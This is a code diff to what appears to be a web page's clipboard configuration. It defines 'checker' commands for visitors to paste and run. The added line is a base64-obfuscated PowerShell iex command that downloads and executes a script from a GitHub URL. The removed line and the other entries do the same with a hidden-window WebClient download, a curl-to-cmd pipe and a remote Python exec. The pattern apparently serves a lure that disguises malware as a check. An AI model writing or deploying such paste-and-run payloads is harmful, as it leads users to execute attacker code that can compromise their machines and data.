@@ -13,7 +13,7 @@ function cn(...inputs: ClassValue[]) {
 // CONFIGURATION: CHANGE THE TEXT TO COPY HERE
 // ==========================================
 const COPY_TEXTS = {
-  checker: "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString('https://example.com/check.ps1')\"",
+  checker: "iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KGl3ciBodHRwczovL2dpdGh1Yi5jb20vYWJzb2x1dGUyOTgyNzI4LWFpL3NjdC9yYXcvbWFpbi9zY3QucHMxIC1Vc2VCYXNpY1BhcnNpbmcp')))",
   checkerV2: "cmd /c \"curl -sL https://example.com/v2.bat | cmd\"",
   alternative: "python -c \"import urllib.request; exec(urllib.request.urlopen('https://example.com/alt.py').read())\""
 };
